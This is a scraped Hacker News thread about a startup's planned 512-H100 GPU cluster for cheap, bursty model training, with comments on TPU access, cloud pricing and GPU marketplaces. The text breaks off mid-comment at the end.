[
  {
    "id": 36933603,
    "title": "Show HN: San Francisco Compute – 512 H100s at < $2/hr for research and startups",
    "originLink": "https://sfcompute.org/",
    "originBody": "Hey folks! We&#x27;re Alex and Evan, and we&#x27;re working on putting together a 512 H100 compute cluster for startups and researchers to train large generative models on.\n  - it runs at the lowest possible margins (&lt;$2.00&#x2F;hr per H100)\n  - designed for bursty training runs, so you can take say 128 H100s for a week\n  - you don’t need to commit to multiple years of compute or pay for a year upfront<p>Big labs like OpenAI and Deepmind have big clusters that support this kind of bursty allocation for their researchers, but startups so far have had to get very small clusters on very long term contracts, wait months of lead time, and try to keep them busy all the time.<p>Our goal is to make it about 10-20x cheaper to do an AI startup than it is right now. Stable Diffusion only costs about $100k to train -- in theory every YC company could get up to that scale. It&#x27;s just that no cloud provider in the world will give you $100k of compute for just a couple weeks, so startups have to raise 20x that much to buy a whole year of compute.<p>Once the cluster is online, we&#x27;re going to be pretty much the only option for startups to do big training runs like that on.",
    "commentLink": "https://news.ycombinator.com/item?id=36933603",
    "commentBody": "Show HN: San Francisco Compute – 512 H100s atYour project has a youthful optimism that I hope you won’t lose as you go. And in fact it might be the way to win in the long run.This is the nicest thing anyone has said to us about this. We're gonna frame this and hang it out on our wall.> So whenever someone comes knocking, begging for a tiny slice of your H100s for their harebrained idea, I hope you’ll humor them.Absolutely! :Dreplycamhart 18 hours ago | root | parent | next [–] Optimism is (almost) always required in order to accomplish anything of significance. Those who lose it, aren't living up to their potential.I'm not encouraging the false belief that everything you do will work out. Instead I'm encouraging the realization that the greatest accomplishments almost always feel like long shots, and require significant amounts of optimism. Fear and pessimism, while helpful in appropriate doses, will limit you greatly in life if you let them rule you too significantly.When I look back on my life, the greatest accomplishments I've achieved are ones where I was naive yet optimistic going into it. This was a good thing, because I would have been too scared to try had I really known the challenges that lay ahead.replyFrost1x 16 hours ago | root | parent | next [–] >Optimism is (almost) always required in order to accomplish anything of significance. Those who lose it, aren't living up to their potential.I argue that realism trumps optimism. It's perfectly normal in a realist farming to see something difficult, acknowledge the high risk and failure potential, and still pursue something with intent to succeed.I've personally grown tired of over optimism everywhere because it creates unrealistic situations and passes consequences of failure in an inequitable way. The \"visionary\" is rewarded when the rare successes occur, while everyone else suffers the consequences for most failures. No contingency plans for failure, no discussion of failure, and so on. Optimism just takes any idea, pursues it and consequences be someone else's problem and be damned.Pessimism isn't much better, you essentially think everything is too risky or unlikely to succeed so you never do anything. You live in a state of inaction because any level of risk or uncertainty is too much.To me, realism is much better. You acknowledge the challenge. You acknowledge the risk. You make sure everyone involved understands it, but you still charge forward knowing you might succeed. Some think if you're not naively optimistic (what most people in my experience refer to as \"optimism\") you don't create enough pressure. I think that's non-sense.replyOrsonSmelles 13 hours ago | root | parent | next [–] While I've said something like this comment scores of times in my life, and it's definitely a necessary corrective for a lot of optimists who don't think too hard about how they think, I don't think it's a useful place to stop. It's not hard to get unanimous agreement with \"be a realist!\" because it's framed so the alternative is irrationality/delusion. But even among people who agree that the goal should be to reason under uncertainty and assess risks clearly, there will be a spectrum of risk tolerance, and I don't think it's the worst thing ever to describe that as \"optimism\" vs. \"pessimism\"! (I fully acknowledge this isn't the dominant usage, but I think some spaces lean this way)In this context, I tend to read the parent claim as something like, \"great success requires willingness to sometimes take worse-than-even odds or pursue modestly-negative-EV opportunities\". I'm not sure I agree with the strongest version of that, but I think it's likely that the space of risky paths to great achievement is richer than that of cautious ones.replyhackernewds 14 hours ago | root | parent | prev | next [–] If everyone were a realist, we wouldn't have half the advances we do. Because what can be \"real\" is proven wrong through innovation, after all isn't that disruption? :)Sam Altman talks about this quite frequently, that it's not intelligence or luck necessary for an enduring innovation. It is persistence in the face of inevitability, and a high tolerance for being proven wrong and still persistingreplyOO000oo 13 hours ago | root | parent | next [–] Everybody knows socialism is impossible though. Can't work, not worth trying, don't even think about it.replyrileyphone 15 hours ago | root | parent | prev | next [–] You can be a realist visionary.replyFrost1x 14 hours ago | root | parent | next [–] Absolutely, which is what I advocate for.replyhgsgm 15 hours ago | root | parent | prev | next [–] Realism doesn't work in business. Business success requires 10 people to try for 1 person to succeed. If those 10 people were realists, they wouldn't try.replyworldsayshi 14 hours ago | root | parent | next [–] Depends how much that one person wins and how much the others lose.replydhash 16 hours ago | root | parent | prev | next [–] YC startup founder here,Mostly agree, except the market is not an optimistic place — it’s the market.There are a multitude of reasons you lose your optimism, mostly because people take it away — your optimism is their moneyreplyjohnthewise 5 hours ago | root | parent | prev | next [–] I like this quote from Napoleon on taking risks: “If the art of war were nothing but the art of avoiding risks, glory would become the prey of mediocre minds.... I have made all the calculations; fate will do the the rest.\"replyjacquesm 4 hours ago | root | parent | prev | next [–] To me the payoff of failed projects is in what I learned. As long as that's the case I can carry my optimism over into new projects.replyhackernewds 14 hours ago | root | parent | prev | next [–] What a beautiful and articulate thought. thank youreplyzak 15 hours ago | parent | prev | next [–] Actually, the TPU Research Cloud program is still going strong! We've expanded the compute pool significantly to include Cloud TPU v4 Pod slices, and larger projects still use hundreds of chips at a time. (TRC capacity has not been reclaimed for internal use.)Check out this list of recent TRC-supported publications: https://sites.research.google/trc/publications/Demand for Cloud TPUs is definitely intense, so if you're using preemptible capacity, you're probably seeing more frequent interruptions, but reserved capacity is also available. Hope you email the TRC support team to say hello!replysillysaurusx 14 hours ago | root | parent | next [–] Zak, I love you buddy, but you should have some of your researchers try to use the TRC program. They should pretend to be a nobody (like I was in 2019) and try to do any research with the resources they’re granted. I guarantee you those researchers will all tell you “we can’t start any training runs anymore because the TPUs die after 45 minutes.”This may feel like an anime betrayal, since you basically launched my career as a scientist. But it’s important for hobbyists and tinkerers to be able to participate in the AI ecosystem, especially today. And TRC just does not support them anymore. I tried, many times, over the last year and a half.You don’t need to take my word for it. Here’s some unfiltered DMs on the subject: https://imgur.com/a/6vqvzXsNotice how their optimism dries up, and not because I was telling them how bad TRC has become. It’s because their TPUs kept dying.I held out hope for so long. I thought it was temporary. It ain’t temporary, Zak. And I vividly remember when it happened. Some smart person in google proposed a new allocation algorithm back near the end of 2021, and poof, overnight our ability to make TPUs went from dozens to a handful. It was quite literally overnight; we had monitoring graphs that flatlined. I can probably still dig them up.I’ve wanted to email you privately about this, but given that I am a small fish in a pond that’s grown exponentially bigger, I don’t think it would’ve made a difference. The difference is in your last paragraph: you allocate reserved instances to those who deserve it, and leave everybody else to fight over 45 minutes of TPU time when it takes 25 minutes just to create and fill your TPU with your research data.Your non-preemptible TPUs are frankly a lie. I didn’t want to drop the L word, but a TPUv3 in euw4a will literally delete itself — aka preempt — after no more than a couple hours. I tested this over many months. That was some time ago, so maybe things have changed, but I wouldn’t bet on it.There’s some serious “left hand doesn’t know that right hand detached from its body and migrated south for the winter” energy in the TRC program. I don’t know where it embedded itself, but if you want to elevate any other engineers from software devs to researchers, I urge you to make some big changes.One last thing. The support staff of TRC is phenomenal. Jonathan Colton has worked more miracles than I can count, along with the rest of his crew. Ultimately he had to send me an email like “by the way, TRC doesn’t delete TPUs. This distinction probably won’t be too relevant, but I wanted to let you know” (paraphrasing). Translation: you took the power away from the people who knew where to put it (Jonathan) and gave it to some really important researchers, probably in Brain or some other division of Google. And the rest is history. So I don’t want to hear that one of the changes is “ok, we’ve punished the support staff” - as far as I can tell, they’ve moved mountains with whatever tools they had available, and I definitely wouldn’t have been able to do any better in their shoes.Also, hello. Thanks for launching my career. Sorry that I had to leave this here, but my duty is to the open source community. The good news is that you can still recover, if only you’d revert this silly “we’ll slip you some reserved TPUs that don’t kamikaze themselves after 45 minutes if you ask in just the right way” stuff. That wasn’t how the program was in 2019, and I guarantee that I couldn’t have done the work I did then under the current conditions.replynl 14 hours ago | root | parent | next [–] > You don’t need to take my word for it. Here’s some unfiltered DMs on the subject: https://imgur.com/a/6vqvzXs> Notice how their optimism dries up, and not because I was telling them how bad TRC has become. It’s because their TPUs kept dying.Unless I'm misreading this they sound pretty happy and you sound pessimistic? Their last substantial comment was \"I'm sure Zak could hook you up with something better\"?replysillysaurusx 13 hours ago | root | parent | next [–] TRC is supposed to be the “something better”. This insider TPU stuff is for the birds. If TRC can only offer 4 hours with no preemptions, that’s fine, but they need to be up front about that. Saying that TPUs preempt every 24 hours and then killing them off after 45 minutes is… not very productive.As for their comments, the third screenshot is the key; they’re agreeing that the situation is bad. They’re a friend, and they’re a little indirect with the way they phrase things. (If you’ve ever had a friend who really doesn’t want to be wrong, you know what I mean; they kind of say things in a circular way in order to agree without agreeing. After awhile it’s pretty cute and endearing though.)I was particularly pessimistic in those DMs because it came a couple months after I thought I’d give TRC one last try, back in January, which was roughly a year after I’d started my “ok, I’m losing hope, but I’ll wait and see” journey. In the meantime I kept cheerleading TRC and driving people to their signup page. But after the TPUs all died in less than two hours yet again, that was that.I have a really high tolerance for faulty equipment. This is free compute; me complaining is just ungrateful. But I saw what things were like in 2019. “Different” would be the understatement of the century. If my baby wasn’t being incubated in the NICU today, I’d show the charts where our usage went from thousands of cores down to almost zero, and not for lack of trying.It also would’ve been fine to say “sorry, this is unsustainable, the new limits are one tpu per person per project” and then give me a rock solid tpu. We had those in 2021. One of our TPUv3s stayed online for so long that I started to host my blog on it just to show people that TPUs were good for more than AI; the uptime was measured in months. Then poof, now you can barely fire one up.replynl 11 hours ago | root | parent | next [–] I don't have a qualified opinion on the subject of TPU availability.I'm just pointing out that your summary of the DMs (\"Notice how their optimism dries up, and not because I was telling them how bad TRC has become. It’s because their TPUs kept dying\") is the opposite of what the DMs show.replyzak 11 hours ago | root | parent | prev | next [–] As mentioned in another comment, it sounds like you're using preemptible TRC TPU quota. If you use on-demand TRC TPU quota instead, that should improve your uptime substantially.replyKirillPanov 9 hours ago | root | parent | prev | next [–] This is totally fascinating.Frankly, it sounds to me like they're having severe yield+reliability problems with the TPUv4s that aren't getting caught by wafer-level testing, and have binned the flakiest ones for use by outsiders.A lot of yield issues show up as spontaneous resets/crashes.replynl 9 hours ago | root | parent | next [–] It's more likely Google preempting researcher who are on a preemptable research grant, and it is happening a lot more often because there are more paying customers.replyKirillPanov 9 hours ago | root | parent | next [–] \"Preemptable money\" sounds like the kind of bullshit I would use to cover up failed chips. And yes, I am a VLSI engineer.replyzak 13 hours ago | root | parent | prev | next [–] A few quick comments:> But it’s important for hobbyists and tinkerers to be able to participate in the AI ecosystemTotally agree! This was a big part of my original motivation for creating the TPU Research Cloud program. People sometimes assume that e.g. an academic affiliation is required to participate, but that isn't true; we want the program to be as open as possible. We should find a better way to highlight the work of TRC tinkerers - for now, the GitHub and Hugging Face search buttons near the top of https://sites.research.google/trc/publications/ provide some raw pointers.I'm sorry to hear that you've personally had a hard time getting TPU v3 capacity in europe-west4-a. In general, TRC TPU availability varies by region and by hardware generation, and we've experimented with different ways of prioritizing projects. It's possible that something was misconfigured on our end if your TPU lifetimes were so short. Could you email Jonathan the name of the project(s) you were using and any other data you still have handy so we can figure out what was going wrong?Also, thanks for the kind words for Jonathan and the rest of the TRC team. They haven't lost any power or control, and they are allocating a lot more Cloud TPU capacity than ever. However, now that everyone wants to train LLMs, diffusion models, and other exciting new things, demand for TPU compute is way up, so juggling all of the inbound TRC requests is definitely more challenging than it used to be.replysillysaurusx 13 hours ago | root | parent | next [–] It’s not euw4a. It’s everywhere. The allocation algorithm across the board kills off TPUs after no more than a couple hours. usc1f, usc1a, usc1c, euw4a; it makes no difference.It would be funny if someone set gpt-2-15b-poetry (our project) in some special way to prevent us from making TPUs that ever last more than a few hours, but from what I’ve heard from other people, this isn’t the case. That’s what I mean about the left hand doesn’t know what’s going on with the right hand. It’s not a misconfiguration. Again, pretend to be some random person who just wants to apply for TPU access, fill out your form, then try to do research with the TPUs that are available to you. You’ll have a rough time, but it’ll also cure this misconception that it’s a special case or was just me.Again, no need to take my word for it; here’s an organic comment from someone who was rolling their eyes whenever I was cheerleading TRC, because their experience was so bad: https://news.ycombinator.com/item?id=36936782I think that the experience is probably great for researchers who get special approval. And that’s fine, if that’s how the program is designed to be. But at least tell people that they shouldn’t expect more than an hour or two of TPU time.replyzak 11 hours ago | root | parent | next [–] It sounds like you're primarily using preemptible TPU quota, which doesn't come with any availability or uptime expectations at all.By default, the TRC program grants both on-demand quota and preemptible quota. If you are able to create a TPU VM with your on-demand quota, it should last quite a bit longer than a few hours. (There are situations in which on-demand TRC TPU VMs can be interrupted, but these ought to be rare.) If your on-demand TPU VMs are being interrupted frequently, please email TRC support and provide the names of the TPU hosts that were interrupted so folks can try to help.When there is very high demand for Cloud TPUs, it's certainly possible for preemptible TPU VMs to be interrupted frequently. It would be an interesting engineering project to make a very robust training system that could make progress even with low TPU VM uptime, and I hope someone does it! Until then, though, you should have a better experience with on-demand resources when you're able to create them. Reserved capacity is even better since it provides an expectation of both availability and uptime.replychoppaface 11 hours ago | root | parent | prev | next [–] Main problem with the TPU Research Cloud is you get dragged down a LOT by the buggy TPU API-- not just the Google Cloud API being awful but the Tensorflow/Jax/Pytorch support also being awful too. You also basically must use Google Cloud Storage, which is also slow and can be really expensive getting anything into / out-of.The Googlers maintaining the TPU Github repo also just basically don't care about your PR unless it's somehow gonna help them in their own perf review.In contrast with a GPU-based grid, you can not only run the latest & greatest out-of-the-box but also do a lot of local testing that saves tons of time.Finally, the OP here appears to be offering real customer engagement, which is totally absent from my own GCloud experiences across several companies.replyzak 11 hours ago | root | parent | next [–] Could you share a few technical details about the issues you've encountered with TF / JAX / PyTorch on Cloud TPUs? The overall Cloud TPU user experience improved a whole lot when we enabled direct access to TPU VMs, and I believe the newer JAX and PyTorch integrations are improving very rapidly. I'd love to know which issues are currently causing the most friction.replylatchkey 19 hours ago | parent | prev | next [–] What Shawn says is absolutely right. The race right now is way too hot for this stuff. A single customer will eat up 512 gpus for 3 years.replyhaldujai 15 hours ago | parent | prev | next [–] My experience has been different. Considering how easy the application is I think they're still being fairly generous as I've been offered multiple v3-8s and v3-32s x 30days as well as pre-emptible v3-64s x 28 days for a few different projects within the last 6 months.Are you affiliated with an academic institution? Otherwise I'm not sure why they're been more generous with me, my projects have been mildly interesting at best.They're certainly a lot stingier with larger pods than they used to be though.replynwoli 6 hours ago | parent | prev | next [–] > In 2023 you can barely get a single TPU for more than an hourOh come on, colab gives TPU access in the free tier for a whole half day. No need to exaggerate the shortagereplyShamelessC 15 hours ago | parent | prev | next [–] Wow! I never thought you’d see the light. All I ever see from your posts is praise for TRC. As someone who got started way later on, I had infinitely more success with a gaming GPU I owned myself. Obviously not really comparable, but TRC was very very difficult to work with. I think I only ever had access to a TPUv3 once and that wasn’t nearly enough time to learn the ropes.My understanding was that this situation changed drastically depending on what sort of email you had or how popular your Twitter handle was.replyLoganDark 19 hours ago | parent | prev | next [–] > In 2023 you can barely get a single TPU for more than an hour.Um. Can't you order them from coral.ai and put them in an NVMe slot? Or are the cloud TPUs more powerful?replywhimsicalism 19 hours ago | root | parent | next [–] TPU pod is not sold by google, edge tpu is differentreplyLoganDark 19 hours ago | root | parent | next [–] So the cloud TPUs are more powerful...? Or what are you saying?replysillysaurusx 19 hours ago | root | parent | next [–] Yeah, it’s a silly branding thing.One TPU (not even a pod, just a regular old TPUv2) has 96 CPU cores with 1.4TB of RAM, and that’s not even counting their hardware acceleration. I’d love to buy one.replyhaldujai 15 hours ago | root | parent | next [–] Huh, this doesn't seem right. Based on #s you seem to be referring to pods but even then I'm not familiar with such a configuration existing.A single TPUv2 chip has 1 core and 8gb of memory. A single device comes in the v2-8 configuration with 8 cores and 64gb of memory.Pod variants come in v2-32 to v2-512 configurations.replysimonster 13 hours ago | root | parent | next [–] A single TPUv2 host has 8 TPU cores with 64GB of total HBM (8GB per core), but like GPUs, TPUs can't directly access a network, so the host also needs CPUs and standard RAM to send data to them. They are fast, and the host has to be fast enough to keep them fed with data, so the host is pretty beefy. But FWIW, a TPUv2 host has somewhere around 330GB of RAM, not 1.4TB.replyhaldujai 9 hours ago | root | parent | next [–] Thanks for clarifying, I misinterpreted the commenter as referring to the accelerator as the conversation was about TPU availability for purchase.I know just enough about the architecture to facilitate using TPUs for research training runs but I'm not sure what's so special about the host?Sure it's beefy but there are much beefier servers readily available.replydgacmu 13 hours ago | root | parent | prev | next [–] Edge TPUs are low cost, low power inference devices the size of a dime. I have a hundred of them sitting in a closet. (Alas. Anyone want to buy 100 coral minis? :-)The TPUs you rent that are being discussed here are capable of training, consume hundreds of watts and have a heatsink bigger than your fist and really spectacular network links. They're analogous to Nvidia's highest end GPUs from a \"what can you do with them\" perspective.Both are custom chips for deep learning but they're completely different beasts.replyfragmede 12 hours ago | root | parent | next [–] Can I hook a microphone up to a Coral Mini and run Whisper? I'd love to have a home assistant that wasn't on the cloud.As for the rest of them, list them on Amazon and let them do the fulfillment. That $10k of hardware isn't going to sell itself from your closet. (Yet. LLMs are making great strides.)replydgacmu 2 hours ago | root | parent | next [–] It has a microphone built in.And that's a good idea, thanks. I've been dreading the idea of using ebay.replybuildbot 13 hours ago | root | parent | prev | next [–] They are entirely different chips - like an order of magnitude in terms if transistor count and die size.replywhimsicalism 19 hours ago | root | parent | prev | next [–] yesreplywhack 16 hours ago | prev | next [–] > Rather than each of K startups individually buying clusters of N gpus, together we buy a cluster with NK gpus... Then we set up a job scheduler to allocate computeIn theory, this sounds almost identical to the business model behind AWS, Azure, and other cloud providers. \"Instead of everyone buying a fixed amount of hardware for individual use, we'll buy a massive pool of hardware that people can time-share.\" Outside of cloud providers having to mark up prices to give themselves a net-margin, is there something else they are failing to do, hence creating the need for these projects?replytikkun 13 hours ago | parent | next [–] Couple things, mostly pricing and availability:1) Margins. Public cloud investors expect a certain margin profile. They can’t compete with Lambda/Fluidstack’s margins.2) To an extent also big clouds have worse networking for LLM training. I believe only Azure has infiniband. Oracle is 3200 Gbps but not infiniband, same for AWS I believe. GCP not sure but their A100 networking speeds were only 100 Gbps I believe rather than 1600. Whereas lambda, fluidstack and coreweave all have ib.3) Availability. Nvidia isn’t giving big clouds the allocation they want.replybravura 8 hours ago | root | parent | next [–] What is your differentiator from Lambda? That you are smaller and in a single DC?Sincere question.replytikkun 1 hour ago | root | parent | next [–] I'm not OP/submitter, but the main differentiator is that Lambda doesn't have on-demand availability for lots of interlinked H100s - you have to reserve them.Lambda has \"Lambda Sprint\" which is kinda similar,[1] but Sprint is $4.85/GPU/hr instead ofIt’s just not a feature that has ever been of much use pre-GenAI. How often do you need to request 1000 CPU nodes for 48 hours in a single zone?I would srgue this has always been a common case for cloud GPU computereplyabraae 16 hours ago | parent | prev | next [–] AWS and Azure would slit their own throats before they created a way for their customers to pool instances to save money.They want to do that themselves, and keep the customer relationship and the profits, instead of giving them to a middleman or the customer.replyjiggawatts 15 hours ago | root | parent | next [–] It’s just corporate profits combined with market forces, not a some sort of malicious conspiracy.You can rent a 2-socket AMD server with 120 available cores and RDMA for something like 50c to $2 per hour. That’s just barely above the cost of the electricity and cooling!What do you want, free compute just handed to you out of the goodness of their hearts?There is incredible demand for high-end GPUs right now, and market prices reflect that.replyabraae 15 hours ago | root | parent | next [–] You mentioned malicious conspiracy, not me.It's just business and I'd do the same if I was in charge of AWS.replymikeravkine 14 hours ago | root | parent | prev | next [–] Sorry where are these .50c many core servers you speak of exactly?replymegakwood 14 hours ago | root | parent | prev | next [–] Where can you get 120 cores for $2/hr?replyalex_lav 14 hours ago | root | parent | prev | next [–] > You can rent a 2-socket AMD server with 120 available cores and RDMA for something like 50c to $2 per hour.Source requiredreplyasdfaoeu 13 hours ago | root | parent | prev | next [–] AWS and Azure both charge by the hour anyway so it wouldn't but if you wanted you could use Reserved instances and just have their accounts in the same organisation.A large part of the profit comes from the upfront risk of buying machines. With this you are just absorbing that risk which may be better if the startup expects to last.replywodenokoto 8 hours ago | prev | next [–] > It's just that no cloud provider in the world will give you $100k of compute for just a couple weeksI've never had to buy very large compute, but I thought that was the whole point of the cloudreplybnr4u 16 hours ago | prev | next [–] Having hosted infrastructure in CA at multiple colos. I would advise you to host it elsewhere if you can, cost of power, other infrastructure is much higher in CA than AZ or NV.replyec109685 14 hours ago | parent | next [–] Power seems like a very small amount of cost of compute when it comes to GPU’s.replyversion_five 14 hours ago | root | parent | next [–] FWIW I tired to look up some numbers, i found California \"industrial\" electricity at $0.18/Kwh https://www.eia.gov/electricity/monthly/epm_table_grapher.ph... and H100s using 300-700w https://www.nvidia.com/en-us/data-center/h100/ which implies a worst case marginal cost of .18*.7 = $.126 / gpu / hour. Looks like Montana is cheapest at ~$.05 / kwh which would bring that down to $.035. So there may be about a $0.09 California premium (vs the absolute cheapest possibility), which as you say is a small amount of the total cost, but could be material for large workloads.replyjedberg 13 hours ago | root | parent | next [–] Retail residential power in the city of Santa Clara is $0.15/KwH, I'm sure commercial could be less. Especially if you throw some solar panels on the roof.The most expensive part would be the land, but honestly there is some pretty cheap land outside the cities.replyfragmede 8 hours ago | root | parent | next [–] For reference, I'm in SF and paid PGE $0.50938/KWh during peak hours, residential, last bill.replyhackernewds 14 hours ago | root | parent | prev | next [–] over regulation and taxesreplywilliamstein 19 hours ago | prev | next [–] How does this compare to https://lambdalabs.com/ ?replyflaque 19 hours ago | parent | next [–] Ah, we're running a medium amount of compute at zero-margin. The point is not to go sell the Fortune 500, but to make sure a grad student can spend a $50k grant.Right now, it's pretty easy to get a few A/H100s (Lambda is great for this), but very hard to get more than 24 at a reasonable price ($~2 an hour). One often needs to put up a 6+ month commitment, even when they may only want to run their H100s for an 8 hour training run.It's the right business decision for GPU brokers to do long term reservations and so on, and we might do so too if we were in their shoes. But we're not in their shoes and have a very different goal: arm the rebels! Let someone who isn't BigCorp train a model!replytrostaft 18 hours ago | root | parent | next [–] > but to make sure a grad student can spend a $50k grant.As a graduate student, thank you. Thankfully, my workloads aren't LLM crazy so I can get by on my old NVIDIA consumer hardware, but I have coworkers struggling to get reasonable prices/time for larger scale hardware.replynarrator 17 hours ago | root | parent | prev | next [–] So what happens when some big bucks VC backed closed source LLM company buys all your compute inventory for the next 5 years? This is not that unlikely. Lambda Labs a little while back was completely sold out of all compute inventory.replyxeromal 16 hours ago | root | parent | next [–] I assume it's up to them to say no. They did say they're not in it to make bookoo bucksreplyagajews 16 hours ago | root | parent | next [–] Yeah we aren’t going to let anyone book the whole thing for years. If we ever have to make the choice, we’ll choose the startups over the big companies.replyflaque 15 hours ago | root | parent | next [–] Yeah, if someone doesn't care about the cost and wants to buy whole cluster, they might be better off using an existing provider.replystavros 5 hours ago | root | parent | prev | next [–] I must say, this is the worst I've seen \"beaucoup\" spelled.replygnopgnip 11 hours ago | root | parent | prev | next [–] Presumably them buy more gpusreplyec109685 14 hours ago | root | parent | prev | next [–] How can you allow people to get big chunks of GPU’s without a lot of expensive slack in the system?replylulunananaluna 18 hours ago | root | parent | prev | next [–] This is great. Thank you very much for your work.replywongarsu 19 hours ago | parent | prev | next [–] Very similar price, but from what I gather very different model. One important difference might be if you regularly run short-ish training runs over many GPUs. Lambdalabs might not have 256 instances to give you right now. With OP you are basically buying the right to put jobs in the job queue for their 512 GPU cluster, so running a job that needs 256 GPUs isn't an issue (though you might wait behind someone running a 512 GPU job).No idea how capacity at lambdalabs actually looks like though. Does anyone have insight how easy it is to spin up more than 2-3 instances up there?replyagajews 18 hours ago | root | parent | next [–] Yeah it’s pretty hard to find a big block of GPUs that you can use for a short time, esp if you need infiniband for multinode training. Lambda I think needs a min reservation of 6-12 months if you want IB.replyjorlow 19 hours ago | parent | prev | next [–] You can usually only get a few h100s at a time unless you're committed to reserved instances (for a longer time period)replyivalm 16 hours ago | parent | prev | next [–] No real way to get a big block without commitment. Iirc smallest h100 commitment is 64gpus for 3 years (about $3M usd).replytheptip 18 hours ago | parent | prev | next [–] My question too. At $2/hr for H100 that seems more flexible? But I haven’t tried to get 10k GPU-hours on any of these services, maybe that is where the bottleneck is.replydudus 13 hours ago | prev | next [–] I know AWS/GCP/Azure have overhead and I understand why so many companies choose to go bare metal on their ops. I personally rarely think it's worth the time and effort, but I get that with scale saving can be substantial.But for AI training? If the public cloud isn't competitive even for bursty AI training, their margins are much higher than I anticipated.OP mentions 10-20x cost reduction? Compared to what? AWS?replyjerjerjer 6 hours ago | parent | next [–] AWS offers p5.48xlarge which is 8xH100 for $98.32, so 12.29$ per hour per H100 - ~6x the price.replywhimsicalism 19 hours ago | prev | next [–] I am super interested in AI on a personal level and have been involved for a number of years.I have never seen a GPU crunch quite like it is right now. To anyone who is interested in hobbyist ML, I highly highly recommend using vast.aireplytikkun 13 hours ago | parent | next [–] Additional clouds:For H100s and A100s - lambda, fluidstack, runpod. Also coreweave and crusoe and oblivus and latitudeFor non a/h100s: vast, Tensordock, also runpod here tooreplywilliamstein 17 hours ago | parent | prev | next [–] Many thanks for posting about vast.ai, which I had never heard of! It's a sort of \"gig economy/marketplace\" for GPU's. The first machine I tried just now worked fine, had 512GB of RAM, 256 AMC CPUs, an A100 GPU, and I got about 4 minutes for $0.05 (which they provided for free).replywhimsicalism 15 hours ago | root | parent | next [–] The only caveat is it is not really appropriate for private usecases.Also, many of the available options clearly are recycled crypto mining rigs which have somewhat odd configurations (poor gpu bandwidth, low cpu ram).replyquickthrower2 16 hours ago | parent | prev | next [–] Depends on what you class as hobbyist but I am running a T4 for a few minutes to get acquainted with tools and concepts and I found modal.com really good for this. They resell AWS and GCP at the moment. They also have A100 but T4 is all I need for now.replywhimsicalism 15 hours ago | root | parent | next [–] Significantly more expensive than equivalent 3090 configuration if you can do model parallelismreplyquickthrower2 15 hours ago | root | parent | next [–] What do you mean by this? I use less than the $30/m free included usage.I am guessing you mean at some point just buy your own 3090 as it will be cheaper than paying a cloud per second for a server-grade Nvidia setup.replywhimsicalism 15 hours ago | root | parent | next [–] I think this is more applicable for training usecases. If you can get by with less than $30/mo in aws compute (quite expensive) then it likely does not make a didference.What I mean is that you can rent out 4 3090 GPUs for much cheaper than renting an A100 on aws because you are not paying Nvidia's \"cloud tax\" on flops/$replykaycebasques 16 hours ago | prev | next [–] Hi, SF lover [1] here. Anything interesting to note about your name? Will your hardware actually be based in SF? Any plans to start meetups or bring customers together for socializing or anything like that?[1] We have not gone the way of the Xerces blue [2] yet... we still exist![2] https://en.wikipedia.org/wiki/Xerces_bluereplyagajews 15 hours ago | parent | next [–] Ah the hardware isn’t gonna be in SF (not the cheapest datacenter space)But I do think a lot of our customers will be out here —- SF is still probably the best place to do startups. We just have so many more people doing hard technical stuff here. Literally every single place I’ve lived in SF there’s been another startup living upstairs or downstairsGood idea to host some in person events!replymenthe 4 hours ago | root | parent | next [–] > SF is still probably the best place to do startups.now that's a hot take if I ever saw onereplynilsbunger 18 hours ago | prev | next [–] I love the idea of community assets. could it be the start of a GPU co-op?replyfragmede 17 hours ago | parent | next [–] For consumer-grade cards, that's already here.Make money off your GPU with vast.AIhttps://cloud.vast.ai/host/setupreplymdaniel 17 hours ago | root | parent | next [–] > Requirements> Ubuntu 18.04 or newer (required)> Dedicated machines only - the machine shouldn't be doing other stuff while rentedwell that's certainly not what I expected. ctrl-f \"virtual\" gives nothing, so it seems they really mean \"take over your machine\"> Note: you may need to install python2.7 to run the install script.what kind of nonsense is this? Did they write the script in 2001 and just abandon it?replymschuster91 17 hours ago | root | parent | next [–] > what kind of nonsense is this? Did they write the script in 2001 and just abandon it?Anything AI/ML is a hot mess of cobbled-together bits and pieces of Python barely holding together. I recently read somewhere that there should be a new specialization of \"ML DevOps Engineer\"... and hell I'm supporting that.replyp1esk 16 hours ago | root | parent | next [–] there should be a new specialization of \"ML DevOps Engineer\"Do you mean MLOps? Nothing new about it. We have two full-time MLOps engineers at our startup.replyethbr0 14 hours ago | root | parent | prev | next [–] Python is awesome because they built what people wanted.Python is terrible because they built what people wanted.replywilliamstein 16 hours ago | root | parent | prev | next [–] I just skimmed their FAQ at https://vast.ai/faq, and it seems like it could use an update. E.g., it says \"Initially we are supporting Ubuntu Linux, more specifically Ubuntu 16.04 LTS.\". That version of Ubuntu has been end-of-life'd for several years, and when I just tried vast.ai out, it seemed to be using Ubuntu 20.04. There were also a couple of words with letters missing (probably trivial typos) that could be found with a spell checker. The questions in their FAQ are really interesting though, in terms of highlighting what users care about (e.g., there's a lot devoted to \"how do I use vast.ai + google colab together\"?). I also wonder when vast.ai started? Sometimes you can get insight from a company blog page, but the vast.ai blog seems to start in Feb 2023: https://vast.ai/blog . There's a bunch of \"personal experiences\" with vast.ai from 3 years ago in this discussion though: https://www.reddit.com/r/MachineLearning/comments/hv49pd/d_c...A comment in that discussion mentions yet another competitor in this space that I've never heard of: https://www.qblocks.cloud/ -- I just tried Q blocks out and the new user experience wasn't as good for me as with vast.ai: you have to put in $10 money to try it, instead of getting to try it initially for free; there is a manual approval process before you can try data center class GPUs; you only see that your instance is in Norway (say) after you try to start it, not before; it seems like there's no ssh access, and they only provide Jupyter to connect; neither pytorch nor tensorflow seemed to be installed. They could probably update their pages too, e.g., https://www.qblocks.cloud/vision is all about crypto mining and smartphones, which feels a bit dated... :-)replymikeravkine 14 hours ago | root | parent | next [–] TensorDock Marketplace is another option: https://marketplace.tensordock.com/order_listIt's unique in that you can set your own prices, it's a true spot marketplace.. I've grabbed 2x3090 for $0.02/hr before.Probably no good for training (can be interrupted any time with zero warning ssh just drops and that's it) but for my inference usecases it lets me spot heavy compute for pennies.replylgats 17 hours ago | root | parent | prev | next [–] check here to see the current bid prices / gpu setups https://cloud.vast.ai/create/replyPartiallyTyped 17 hours ago | root | parent | prev | next [–] My computer is sitting mostly idle at home, thanks for this.replysamstave 17 hours ago | parent | prev | next [–] Serious Q, as I dont know Twitters internal infra at all... but with a shrinking in revenue from ads, or maybe less engagement by users, and the influx of Threads - maybe twitter can use from slices of its infra (even if its rack space, VMs, Containers, connectivity, who knows what, to support startups such as this?Basically twitter devolves into the Colos of the late 90s :-)-For those who didnt notice, it was tongue in cheek.replyversion_five 17 